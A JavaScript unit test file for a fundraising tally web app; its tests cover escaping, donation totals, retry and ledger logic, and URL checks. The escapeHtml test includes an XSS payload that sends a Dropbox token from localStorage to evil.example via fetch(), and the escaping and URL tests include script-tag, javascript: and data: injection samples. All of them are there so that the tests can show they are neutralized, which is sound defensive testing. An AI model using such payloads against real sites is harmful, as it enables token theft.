const test = require('node:test');
const assert = require('node:assert/strict');
const {
    escapeHtml,
    computeTotals,
    sortEntitiesByTotal,
    GENERAL_FUND_ID,
    isGeneralFundEntry,
    computeEventTotal,
    computeRelativeBarPercent,
    GENERAL_FUND_LABEL,
    resolveEntitySelection,
    resolveThemeColor,
    resolveLogoUrl,
    computeGaugeGeometry,
    isDuplicateName,
    isValidTransactionAmount,
    isAllowedMediaUrl,
    VIEWER_HASH,
    isViewerHash,
    buildViewerLinkUrl,
    parseViewerLinkImport,
    KEYER_HASH,
    isKeyerHash,
    computeRetryDelay,
    runUpdateWithRetry,
    flushPendingQueue,
    collapseTransactionLedger,
    computeEditDelta,
    computeDeleteAmount,
    TICKER_HERO_MAX,
    TICKER_TWIN_MAX,
    TICKER_TV_FIELD_PAGE_SIZE,
    pickTickerTier,
    paginate,
} = require('../js/logic.js');

test('escapeHtml', async (t) => {
    await t.test('escapes the five HTML metacharacters', () => {
        assert.equal(escapeHtml(`&<>"'`), '&amp;&lt;&gt;&quot;&#39;');
    });

    await t.test('neutralizes an attribute-breakout XSS payload', () => {
        const payload = `x" onerror="fetch('https://evil.example/?t='+localStorage.dropbox_token)`;
        const escaped = escapeHtml(payload);
        assert.ok(!escaped.includes('"'), 'no raw quote should survive to close the attribute');
        assert.equal(
            escaped,
            'x&quot; onerror=&quot;fetch(&#39;https://evil.example/?t=&#39;+localStorage.dropbox_token)',
        );
    });

    await t.test('neutralizes a script-tag injection payload', () => {
        const escaped = escapeHtml('<script>alert(1)</script>');
        assert.ok(!escaped.includes('<script>'));
        assert.equal(escaped, '&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    await t.test('handles null/undefined/number input without throwing', () => {
        assert.equal(escapeHtml(null), '');
        assert.equal(escapeHtml(undefined), '');
        assert.equal(escapeHtml(42), '42');
    });

    await t.test('leaves ordinary text untouched', () => {
        assert.equal(escapeHtml('Team Alpha'), 'Team Alpha');
    });
});

test('computeTotals', async (t) => {
    const entities = [{ id: 'e1' }, { id: 'e2' }];

    await t.test('sums amounts per entity for the given event only', () => {
        const transactions = [
            { entityId: 'e1', eventId: 'evt1', amount: 10 },
            { entityId: 'e1', eventId: 'evt1', amount: 5.5 },
            { entityId: 'e2', eventId: 'evt1', amount: 3 },
            { entityId: 'e1', eventId: 'evt2', amount: 999 }, // different event, must be excluded
        ];
        const totals = computeTotals(entities, transactions, 'evt1');
        assert.equal(totals.e1, 15.5);
        assert.equal(totals.e2, 3);
    });

    await t.test('entities with no transactions total 0', () => {
        const totals = computeTotals(entities, [], 'evt1');
        assert.deepEqual(totals, { e1: 0, e2: 0 });
    });

    await t.test('ignores transactions referencing an unknown entity', () => {
        const transactions = [{ entityId: 'ghost', eventId: 'evt1', amount: 100 }];
        const totals = computeTotals(entities, transactions, 'evt1');
        assert.deepEqual(totals, { e1: 0, e2: 0 });
    });

    await t.test('handles missing/empty inputs', () => {
        assert.deepEqual(computeTotals([], [], 'evt1'), {});
        assert.deepEqual(computeTotals(undefined, undefined, 'evt1'), {});
    });

    await t.test('excludes General Fund donations from per-entity totals', () => {
        const transactions = [
            { entityId: 'e1', eventId: 'evt1', amount: 10 },
            { entityId: GENERAL_FUND_ID, eventId: 'evt1', amount: 250 },
        ];
        const totals = computeTotals(entities, transactions, 'evt1');
        assert.deepEqual(totals, { e1: 10, e2: 0 });
    });
});

test('isGeneralFundEntry', async (t) => {
    await t.test('identifies the General Fund sentinel and nothing else', () => {
        assert.equal(isGeneralFundEntry(GENERAL_FUND_ID), true);
        assert.equal(isGeneralFundEntry('e1'), false);
        assert.equal(isGeneralFundEntry(undefined), false);
        assert.equal(isGeneralFundEntry(null), false);
    });
});

test('computeEventTotal', async (t) => {
    await t.test('sums every transaction for the event, team-tied and General Fund alike', () => {
        const transactions = [
            { entityId: 'e1', eventId: 'evt1', amount: 10 },
            { entityId: 'e2', eventId: 'evt1', amount: 5 },
            { entityId: GENERAL_FUND_ID, eventId: 'evt1', amount: 250 },
            { entityId: 'e1', eventId: 'evt2', amount: 999 }, // different event, excluded
        ];
        assert.equal(computeEventTotal(transactions, 'evt1'), 265);
    });

    await t.test('handles missing/empty inputs', () => {
        assert.equal(computeEventTotal([], 'evt1'), 0);
        assert.equal(computeEventTotal(undefined, 'evt1'), 0);
    });
});

test('resolveEntitySelection', async (t) => {
    const entities = [
        { id: 'e1', namePublic: 'Team A' },
        { id: 'e2', namePublic: 'Team B' },
    ];

    await t.test('resolves an exact team name match to its id', () => {
        assert.equal(resolveEntitySelection(entities, 'Team A'), 'e1');
        assert.equal(resolveEntitySelection(entities, 'Team B'), 'e2');
    });

    await t.test('trims surrounding whitespace before matching', () => {
        assert.equal(resolveEntitySelection(entities, '  Team A  '), 'e1');
    });

    await t.test('resolves the General Fund label to GENERAL_FUND_ID', () => {
        assert.equal(resolveEntitySelection(entities, GENERAL_FUND_LABEL), GENERAL_FUND_ID);
    });

    await t.test('returns null for an unfinished/unmatched search and empty input', () => {
        assert.equal(resolveEntitySelection(entities, 'Team'), null, 'a partial, in-progress search must not match');
        assert.equal(resolveEntitySelection(entities, 'Nonexistent Team'), null);
        assert.equal(resolveEntitySelection(entities, ''), null);
        assert.equal(resolveEntitySelection(entities, '   '), null);
        assert.equal(resolveEntitySelection(entities, undefined), null);
    });

    await t.test('is case-sensitive (matches namePublic exactly, as the datalist renders it)', () => {
        assert.equal(resolveEntitySelection(entities, 'team a'), null);
    });

    await t.test('handles an empty entities list', () => {
        assert.equal(resolveEntitySelection([], 'Team A'), null);
        assert.equal(resolveEntitySelection(undefined, 'Team A'), null);
    });
});

test('sortEntitiesByTotal', async (t) => {
    await t.test('orders entities highest total first', () => {
        const entities = [{ id: 'a' }, { id: 'b' }, { id: 'c' }];
        const totals = { a: 5, b: 50, c: 20 };
        const sorted = sortEntitiesByTotal(entities, totals);
        assert.deepEqual(
            sorted.map((e) => e.id),
            ['b', 'c', 'a'],
        );
    });

    await t.test('does not mutate the input array', () => {
        const entities = [{ id: 'a' }, { id: 'b' }];
        const totals = { a: 1, b: 2 };
        sortEntitiesByTotal(entities, totals);
        assert.deepEqual(
            entities.map((e) => e.id),
            ['a', 'b'],
        );
    });

    await t.test('treats a missing total as 0', () => {
        const entities = [{ id: 'a' }, { id: 'b' }];
        const sorted = sortEntitiesByTotal(entities, {});
        assert.equal(sorted.length, 2);
    });
});

test('computeRelativeBarPercent', async (t) => {
    await t.test("scales an amount against the leader's amount", () => {
        assert.equal(computeRelativeBarPercent(50, 100), 50);
        assert.equal(computeRelativeBarPercent(100, 100), 100);
        assert.equal(computeRelativeBarPercent(25, 100), 25);
    });

    await t.test('never exceeds 100%, even if amount somehow exceeds the leader', () => {
        assert.equal(computeRelativeBarPercent(150, 100), 100);
    });

    await t.test('floors a $0 (or very small) team at the minimum instead of a zero-width bar', () => {
        assert.equal(computeRelativeBarPercent(0, 100), 4);
        assert.equal(computeRelativeBarPercent(1, 10000), 4);
    });

    await t.test('applies the floor uniformly when the leader has 0 (nobody has raised anything yet)', () => {
        assert.equal(computeRelativeBarPercent(0, 0), 4);
        assert.equal(computeRelativeBarPercent(0, null), 4);
        assert.equal(computeRelativeBarPercent(0, undefined), 4);
    });

    await t.test('accepts a custom floor', () => {
        assert.equal(computeRelativeBarPercent(0, 100, 10), 10);
        assert.equal(computeRelativeBarPercent(0, 0, 0), 0);
    });
});

test('resolveThemeColor', async (t) => {
    await t.test("uses the active event's own themeColor when set", () => {
        const settings = { themeColor: 'bg-blue-600' };
        const activeEvent = { themeColor: 'bg-red-600' };
        assert.equal(resolveThemeColor(settings, activeEvent), 'bg-red-600');
    });

    await t.test('falls back to Settings when the event has no override', () => {
        const settings = { themeColor: 'bg-purple-600' };
        assert.equal(resolveThemeColor(settings, { themeColor: '' }), 'bg-purple-600');
        assert.equal(resolveThemeColor(settings, {}), 'bg-purple-600');
        assert.equal(resolveThemeColor(settings, null), 'bg-purple-600');
    });

    await t.test('falls back to the hardcoded default when nothing is set', () => {
        assert.equal(resolveThemeColor({}, {}), 'bg-blue-600');
        assert.equal(resolveThemeColor(null, null), 'bg-blue-600');
    });
});

test('resolveLogoUrl', async (t) => {
    await t.test("uses the active event's own logoUrl when set", () => {
        const settings = { logoUrl: 'https://example.com/app-logo.png' };
        const activeEvent = { logoUrl: 'https://example.com/event-logo.png' };
        assert.equal(resolveLogoUrl(settings, activeEvent), 'https://example.com/event-logo.png');
    });

    await t.test('falls back to Settings when the event has no override', () => {
        const settings = { logoUrl: 'https://example.com/app-logo.png' };
        assert.equal(resolveLogoUrl(settings, { logoUrl: '' }), 'https://example.com/app-logo.png');
        assert.equal(resolveLogoUrl(settings, {}), 'https://example.com/app-logo.png');
        assert.equal(resolveLogoUrl(settings, null), 'https://example.com/app-logo.png');
    });

    await t.test('falls back to an empty string when nothing is set', () => {
        assert.equal(resolveLogoUrl({}, {}), '');
        assert.equal(resolveLogoUrl(null, null), '');
    });
});

test('computeGaugeGeometry', async (t) => {
    const dashArray = 125.66;

    await t.test('50% raised maps to half the dash array offset', () => {
        const { percentage, dashOffset } = computeGaugeGeometry(50, 100, dashArray);
        assert.equal(percentage, 50);
        assert.ok(Math.abs(dashOffset - dashArray / 2) < 0.001);
    });

    await t.test('clamps over-goal raises at 100%', () => {
        const { percentage, dashOffset } = computeGaugeGeometry(500, 100, dashArray);
        assert.equal(percentage, 100);
        assert.equal(dashOffset, 0);
    });

    await t.test('no/zero goal renders an empty gauge instead of NaN', () => {
        const { percentage, dashOffset } = computeGaugeGeometry(50, null, dashArray);
        assert.equal(percentage, 0);
        assert.equal(dashOffset, dashArray);
        assert.ok(!Number.isNaN(dashOffset));
    });
});

test('isDuplicateName', async (t) => {
    const entities = [
        { id: 'e1', namePublic: 'Team Alpha' },
        { id: 'e2', namePublic: 'Team Beta' },
    ];

    await t.test('is case-insensitive and trim-insensitive', () => {
        assert.equal(isDuplicateName(entities, '  team alpha  '), true);
        assert.equal(isDuplicateName(entities, 'TEAM BETA'), true);
    });

    await t.test('returns false for a genuinely new name', () => {
        assert.equal(isDuplicateName(entities, 'Team Gamma'), false);
    });

    await t.test('excludeId lets an entity keep its own name while editing', () => {
        assert.equal(isDuplicateName(entities, 'Team Alpha', 'e1'), false);
        assert.equal(isDuplicateName(entities, 'Team Alpha', 'e2'), true);
    });
});

test('isValidTransactionAmount', async (t) => {
    await t.test('accepts a positive finite number', () => {
        assert.equal(isValidTransactionAmount(0.01), true);
        assert.equal(isValidTransactionAmount(50), true);
    });

    await t.test('rejects zero and negative amounts', () => {
        assert.equal(isValidTransactionAmount(0), false);
        assert.equal(isValidTransactionAmount(-5), false);
    });

    await t.test('rejects NaN and non-finite values', () => {
        assert.equal(isValidTransactionAmount(NaN), false);
        assert.equal(isValidTransactionAmount(Infinity), false);
        assert.equal(isValidTransactionAmount(-Infinity), false);
    });

    await t.test('rejects non-number types', () => {
        assert.equal(isValidTransactionAmount('50'), false);
        assert.equal(isValidTransactionAmount(null), false);
        assert.equal(isValidTransactionAmount(undefined), false);
    });
});

test('isAllowedMediaUrl', async (t) => {
    await t.test('treats an empty/absent URL as allowed (optional field)', () => {
        assert.equal(isAllowedMediaUrl(''), true);
        assert.equal(isAllowedMediaUrl(undefined), true);
        assert.equal(isAllowedMediaUrl(null), true);
    });

    await t.test('accepts http and https URLs', () => {
        assert.equal(isAllowedMediaUrl('https://example.com/logo.png'), true);
        assert.equal(isAllowedMediaUrl('http://example.com/logo.png'), true);
    });

    await t.test('rejects javascript: and data: schemes', () => {
        assert.equal(isAllowedMediaUrl('javascript:alert(1)'), false);
        assert.equal(isAllowedMediaUrl('data:text/html,<script>alert(1)</script>'), false);
    });

    await t.test('rejects malformed and relative input', () => {
        assert.equal(isAllowedMediaUrl('not a url'), false);
        assert.equal(isAllowedMediaUrl('/relative/path.png'), false);
    });
});

test('isViewerHash', async (t) => {
    await t.test('matches the viewer hash exactly', () => {
        assert.equal(isViewerHash(VIEWER_HASH), true);
        assert.equal(isViewerHash('#tv-viewer'), true);
    });

    await t.test('does not match #tv or the empty/default hash', () => {
        assert.equal(isViewerHash('#tv'), false);
        assert.equal(isViewerHash(''), false);
        assert.equal(isViewerHash('#tv-viewerish'), false);
    });
});

test('buildViewerLinkUrl / parseViewerLinkImport', async (t) => {
    await t.test('round-trips an access token and refresh token through the URL', () => {
        const url = buildViewerLinkUrl('https://example.com/app/', 'access123', 'refresh456');
        assert.equal(url, 'https://example.com/app/#tv-viewer?at=access123&rt=refresh456');

        const hash = url.slice(url.indexOf('#'));
        const parsed = parseViewerLinkImport(hash);
        assert.deepEqual(parsed, { accessToken: 'access123', refreshToken: 'refresh456' });
    });

    await t.test('round-trips an access token with no refresh token', () => {
        const url = buildViewerLinkUrl('https://example.com/app/', 'access123', null);
        assert.equal(url, 'https://example.com/app/#tv-viewer?at=access123');

        const parsed = parseViewerLinkImport(url.slice(url.indexOf('#')));
        assert.deepEqual(parsed, { accessToken: 'access123', refreshToken: null });
    });

    await t.test('parseViewerLinkImport returns null for a plain #tv-viewer sign-in hash', () => {
        assert.equal(parseViewerLinkImport('#tv-viewer'), null);
    });

    await t.test('parseViewerLinkImport returns null for unrelated hashes', () => {
        assert.equal(parseViewerLinkImport('#tv'), null);
        assert.equal(parseViewerLinkImport('#keyer'), null);
        assert.equal(parseViewerLinkImport(''), null);
        assert.equal(parseViewerLinkImport(null), null);
        assert.equal(parseViewerLinkImport(undefined), null);
    });

    await t.test('parseViewerLinkImport returns null if the at param is missing', () => {
        assert.equal(parseViewerLinkImport('#tv-viewer?rt=refresh456'), null);
    });
});

test('isKeyerHash', async (t) => {
    await t.test('matches the keyer hash exactly', () => {
        assert.equal(isKeyerHash(KEYER_HASH), true);
        assert.equal(isKeyerHash('#keyer'), true);
    });

    await t.test('does not match #tv, #tv-viewer, or the empty/default hash', () => {
        assert.equal(isKeyerHash('#tv'), false);
        assert.equal(isKeyerHash('#tv-viewer'), false);
        assert.equal(isKeyerHash(''), false);
        assert.equal(isKeyerHash('#keyerish'), false);
    });
});

test('computeRetryDelay', async (t) => {
    await t.test('grows exponentially with attempt number', () => {
        assert.equal(computeRetryDelay(1, 250, 4000), 250);
        assert.equal(computeRetryDelay(2, 250, 4000), 500);
        assert.equal(computeRetryDelay(3, 250, 4000), 1000);
    });

    await t.test('is capped so retries cannot grow unbounded', () => {
        assert.equal(computeRetryDelay(10, 250, 4000), 4000);
    });
});

test('runUpdateWithRetry', async (t) => {
    const noDelay = () => Promise.resolve();

    await t.test('happy path: fetch, mutate, save once, succeed', async () => {
        const calls = [];
        const result = await runUpdateWithRetry({
            fetchState: async () => calls.push('fetch'),
            updateFn: () => calls.push('update'),
            saveState: async () => {
                calls.push('save');
                return true;
            },
            delay: noDelay,
        });
        assert.equal(result.status, 'success');
        assert.deepEqual(calls, ['fetch', 'update', 'save']);
    });

    await t.test('a failed initial fetch aborts before mutating — no duplicate writes', async () => {
        let updateCalled = false;
        let saveCalled = false;
        const result = await runUpdateWithRetry({
            fetchState: async () => {
                throw new Error('network down');
            },
            updateFn: () => {
                updateCalled = true;
            },
            saveState: async () => {
                saveCalled = true;
                return true;
            },
            delay: noDelay,
        });
        assert.equal(result.status, 'fetch-failed');
        assert.equal(updateCalled, false, 'updateFn must not run against un-refreshed state');
        assert.equal(saveCalled, false);
    });

    await t.test('a fetch failure during a retry also aborts without re-mutating', async () => {
        let fetchCalls = 0;
        let updateCalls = 0;
        const result = await runUpdateWithRetry({
            fetchState: async () => {
                fetchCalls++;
                if (fetchCalls === 2) throw new Error('network blip mid-retry');
            },
            updateFn: () => {
                updateCalls++;
            },
            saveState: async () => false, // always conflicts, forcing a retry
            delay: noDelay,
            maxAttempts: 5,
        });
        assert.equal(result.status, 'fetch-failed');
        assert.equal(fetchCalls, 2);
        assert.equal(updateCalls, 1, 'updateFn must not run again after the retry fetch failed');
    });

    await t.test('409 conflicts retry with backoff and eventually succeed', async () => {
        let saveAttempts = 0;
        let fetchCalls = 0;
        let updateCalls = 0;
        const delays = [];
        const result = await runUpdateWithRetry({
            fetchState: async () => {
                fetchCalls++;
            },
            updateFn: () => {
                updateCalls++;
            },
            saveState: async () => {
                saveAttempts++;
                return saveAttempts >= 3;
            },
            delay: async (ms) => {
                delays.push(ms);
            },
            maxAttempts: 5,
        });
        assert.equal(result.status, 'success');
        assert.equal(saveAttempts, 3);
        assert.equal(fetchCalls, 3, 'one initial fetch plus one re-fetch per retry before the successful save');
        assert.equal(updateCalls, 3, 'updateFn must be re-applied against fresh state on every retry');
        assert.deepEqual(delays, [250, 500]);
    });

    await t.test('gives up cleanly after maxAttempts instead of retrying forever', async () => {
        let saveAttempts = 0;
        const result = await runUpdateWithRetry({
            fetchState: async () => {},
            updateFn: () => {},
            saveState: async () => {
                saveAttempts++;
                return false;
            },
            delay: noDelay,
            maxAttempts: 3,
        });
        assert.equal(result.status, 'conflict-exhausted');
        assert.equal(saveAttempts, 3);
    });

    await t.test('a thrown saveState (e.g. 401) is reported as save-failed, not retried as a conflict', async () => {
        let saveAttempts = 0;
        let delayCalls = 0;
        const authError = new Error('Unauthorized');
        const result = await runUpdateWithRetry({
            fetchState: async () => {},
            updateFn: () => {},
            saveState: async () => {
                saveAttempts++;
                throw authError;
            },
            delay: async () => {
                delayCalls++;
            },
            maxAttempts: 5,
        });
        assert.equal(result.status, 'save-failed');
        assert.equal(result.error, authError);
        assert.equal(saveAttempts, 1, 'must not retry after a save failure that is not a conflict');
        assert.equal(delayCalls, 0, 'must not wait on a backoff delay for a non-retryable failure');
    });
});

test('flushPendingQueue', async (t) => {
    await t.test('drains every item in order on repeated success', async () => {
        const ran = [];
        const result = await flushPendingQueue(['a', 'b', 'c'], async (item) => {
            ran.push(item);
            return { status: 'success' };
        });
        assert.deepEqual(ran, ['a', 'b', 'c']);
        assert.deepEqual(result.succeeded, ['a', 'b', 'c']);
        assert.deepEqual(result.remaining, []);
    });

    await t.test('stops at the first failure, leaving it and everything after it queued', async () => {
        const ran = [];
        const result = await flushPendingQueue(['a', 'b', 'c'], async (item) => {
            ran.push(item);
            if (item === 'b') return { status: 'fetch-failed' };
            return { status: 'success' };
        });
        assert.deepEqual(ran, ['a', 'b'], 'must not attempt items after a failure');
        assert.deepEqual(result.succeeded, ['a']);
        assert.deepEqual(result.remaining, ['b', 'c']);
    });

    await t.test('an empty queue is a no-op', async () => {
        let called = false;
        const result = await flushPendingQueue([], async () => {
            called = true;
            return { status: 'success' };
        });
        assert.equal(called, false);
        assert.deepEqual(result.succeeded, []);
        assert.deepEqual(result.remaining, []);
    });

    await t.test('a failure on the first item leaves the queue untouched', async () => {
        const result = await flushPendingQueue(['a', 'b'], async () => ({ status: 'conflict-exhausted' }));
        assert.deepEqual(result.succeeded, []);
        assert.deepEqual(result.remaining, ['a', 'b']);
    });
});

test('pickTickerTier', async (t) => {
    await t.test('a roster at or under TICKER_HERO_MAX gets the single-column hero tier', () => {
        assert.equal(pickTickerTier(0), 'hero');
        assert.equal(pickTickerTier(1), 'hero');
        assert.equal(pickTickerTier(TICKER_HERO_MAX), 'hero');
    });

    await t.test('just past TICKER_HERO_MAX switches to the twin-column tier', () => {
        assert.equal(pickTickerTier(TICKER_HERO_MAX + 1), 'twin');
        assert.equal(pickTickerTier(TICKER_TWIN_MAX), 'twin');
    });

    await t.test('past TICKER_TWIN_MAX switches to the spotlight+field tier', () => {
        assert.equal(pickTickerTier(TICKER_TWIN_MAX + 1), 'spotlight');
        assert.equal(pickTickerTier(50), 'spotlight');
    });
});

test('paginate', async (t) => {
    await t.test('splits a list into consecutive pages of the given size', () => {
        assert.deepEqual(paginate([1, 2, 3, 4, 5], 2), [[1, 2], [3, 4], [5]]);
    });

    await t.test('a list no longer than the page size is a single page', () => {
        assert.deepEqual(paginate([1, 2, 3], 10), [[1, 2, 3]]);
    });

    await t.test('an empty list produces no pages', () => {
        assert.deepEqual(paginate([], 5), []);
    });

    await t.test('a non-positive or missing page size falls back to one page with everything', () => {
        assert.deepEqual(paginate([1, 2, 3], 0), [[1, 2, 3]]);
        assert.deepEqual(paginate([1, 2, 3], -1), [[1, 2, 3]]);
        assert.deepEqual(paginate([1, 2, 3]), [[1, 2, 3]]);
    });

    await t.test('every item across all pages preserves the original order', () => {
        const list = Array.from({ length: 45 }, (_, i) => i);
        const pages = paginate(list, TICKER_TV_FIELD_PAGE_SIZE);
        assert.deepEqual(pages.flat(), list);
        assert.equal(pages.length, 3);
        assert.deepEqual(
            pages.map((p) => p.length),
            [18, 18, 9],
        );
    });
});

test('collapseTransactionLedger', async (t) => {
    await t.test('a plain create entry becomes a row with the same amount', () => {
        const entries = [
            {
                id: 't1',
                logicalId: 't1',
                kind: 'create',
                entityId: 'e1',
                eventId: 'evt1',
                amount: 50,
                createDate: '2026-01-01T00:00:00.000Z',
                createdBy: 'Admin',
            },
        ];
        const rows = collapseTransactionLedger(entries);
        assert.equal(rows.length, 1);
        assert.equal(rows[0].id, 't1');
        assert.equal(rows[0].amount, 50);
        assert.equal(rows[0].entityId, 'e1');
        assert.equal(rows[0].eventId, 'evt1');
        assert.equal(rows[0].createdBy, 'Admin');
    });

    await t.test('an edit delta sums with the create to produce the current amount', () => {
        const entries = [
            {
                id: 't1',
                logicalId: 't1',
                kind: 'create',
                entityId: 'e1',
                eventId: 'evt1',
                amount: 50,
                createDate: '2026-01-01T00:00:00.000Z',
            },
            {
                id: 't2',
                logicalId: 't1',
                kind: 'edit',
                entityId: 'e1',
                eventId: 'evt1',
                amount: -20,
                createDate: '2026-01-01T00:05:00.000Z',
            },
        ];
        const rows = collapseTransactionLedger(entries);
        assert.equal(rows.length, 1);
        assert.equal(rows[0].amount, 30, '50 + (-20) delta = 30');
        assert.equal(
            rows[0].createDate,
            '2026-01-01T00:00:00.000Z',
            'createDate should be the original entry, not the edit',
        );
        assert.equal(rows[0].modifiedDate, '2026-01-01T00:05:00.000Z', 'modifiedDate should be the latest entry');
    });

    await t.test('a delete entry removes the logical transaction from the results entirely', () => {
        const entries = [
            {
                id: 't1',
                logicalId: 't1',
                kind: 'create',
                entityId: 'e1',
                eventId: 'evt1',
                amount: 50,
                createDate: '2026-01-01T00:00:00.000Z',
            },
            {
                id: 't2',
                logicalId: 't1',
                kind: 'delete',
                entityId: 'e1',
                eventId: 'evt1',
                amount: -50,
                createDate: '2026-01-01T00:05:00.000Z',
            },
        ];
        const rows = collapseTransactionLedger(entries);
        assert.deepEqual(rows, []);
    });

    await t.test('independent logical transactions do not interfere with each other', () => {
        const entries = [
            {
                id: 't1',
                logicalId: 't1',
                kind: 'create',
                entityId: 'e1',
                eventId: 'evt1',
                amount: 10,
                createDate: '2026-01-01T00:00:00.000Z',
            },
            {
                id: 't2',
                logicalId: 't2',
                kind: 'create',
                entityId: 'e2',
                eventId: 'evt1',
                amount: 20,
                createDate: '2026-01-01T00:01:00.000Z',
            },
            {
                id: 't3',
                logicalId: 't2',
                kind: 'delete',
                entityId: 'e2',
                eventId: 'evt1',
                amount: -20,
                createDate: '2026-01-01T00:02:00.000Z',
            },
        ];
        const rows = collapseTransactionLedger(entries);
        assert.equal(rows.length, 1);
        assert.equal(rows[0].id, 't1');
    });

    await t.test('sorts rows newest-created-first', () => {
        const entries = [
            {
                id: 'a',
                logicalId: 'a',
                kind: 'create',
                entityId: 'e1',
                eventId: 'evt1',
                amount: 1,
                createDate: '2026-01-01T00:00:00.000Z',
            },
            {
                id: 'b',
                logicalId: 'b',
                kind: 'create',
                entityId: 'e1',
                eventId: 'evt1',
                amount: 2,
                createDate: '2026-01-02T00:00:00.000Z',
            },
        ];
        const rows = collapseTransactionLedger(entries);
        assert.deepEqual(
            rows.map((r) => r.id),
            ['b', 'a'],
        );
    });

    await t.test('handles an empty/absent ledger without throwing', () => {
        assert.deepEqual(collapseTransactionLedger([]), []);
        assert.deepEqual(collapseTransactionLedger(undefined), []);
    });
});

test('computeEditDelta', async (t) => {
    await t.test('returns the difference needed to reach the new amount', () => {
        assert.equal(computeEditDelta(50, 30), -20);
        assert.equal(computeEditDelta(10, 25), 15);
    });

    await t.test('is zero when the amount is unchanged', () => {
        assert.equal(computeEditDelta(40, 40), 0);
    });
});

test('computeDeleteAmount', async (t) => {
    await t.test('returns the negation of the current amount', () => {
        assert.equal(computeDeleteAmount(50), -50);
        assert.equal(computeDeleteAmount(0.01), -0.01);
    });

    await t.test('summing it back against the current amount always yields exactly 0', () => {
        const current = 123.45;
        assert.equal(current + computeDeleteAmount(current), 0);
    });
});
